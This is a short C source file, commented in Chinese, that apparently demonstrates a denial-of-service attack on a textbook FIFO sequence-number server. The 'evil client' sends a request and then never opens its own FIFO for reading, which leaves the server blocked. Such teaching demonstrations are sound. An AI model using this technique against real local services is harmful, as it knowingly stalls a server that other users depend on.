/* client_dos.c - 惡意客戶端 */
#include "fifo_seqnum.h"

int main(int argc, char *argv[])
{
    int serverFd;
    struct request req;
    char clientFifo[CLIENT_FIFO_NAME_LEN];

    umask(0);

    /* 1. 建立 Client FIFO (設下陷阱) */
    snprintf(clientFifo, CLIENT_FIFO_NAME_LEN, CLIENT_FIFO_TEMPLATE, (long) getpid());
    
    if (mkfifo(clientFifo, S_IRUSR | S_IWUSR | S_IWGRP) == -1 && errno != EEXIST)
        errExit("mkfifo");

    printf("😈 [Evil Client] FIFO created at %s\n", clientFifo);

    /* 2. 連接 Server */
    serverFd = open(SERVER_FIFO, O_WRONLY);
    if (serverFd == -1) errExit("open server fifo");

    /* 3. 建構並發送請求 */
    req.pid = getpid();
    req.seqLen = 1;

    if (write(serverFd, &req, sizeof(struct request)) != sizeof(struct request))
        errExit("Can't write to server");

    printf("😈 [Evil Client] Request sent to Server (PID=%ld).\n", (long)req.pid);
    printf("😈 [Evil Client] The trap is set.\n");
    printf("😈 [Evil Client] I am NOT opening my FIFO for reading.\n");
    printf("😈 [Evil Client] Server should be BLOCKED now (DoS in progress)...\n");

    /* 4. 惡意行為：無限睡眠，絕不開啟讀取端 */
    /* Server 此時會卡在 open(clientFifo, O_WRONLY) 等待讀取者，但讀取者永遠不會出現 */
    while (1) {
        sleep(10);
    }

    return 0;
}